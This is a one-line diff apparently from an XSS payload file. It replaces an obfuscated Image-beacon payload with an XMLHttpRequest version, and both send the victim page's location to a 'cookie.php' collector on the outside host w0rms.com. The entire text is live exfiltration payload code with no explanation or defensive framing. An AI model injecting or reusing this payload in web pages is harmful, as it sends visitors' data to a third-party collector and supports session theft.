@@ -1,1 +1,1 @@
-i=new/**/Image();i.src='http://w0rms.com/cookie.php?cookie='+document.location;
+xhr = new XMLHttpRequest();xhr.open('GET', 'http://w0rms.com/cookie.php?c='+ document.location);xhr.send();
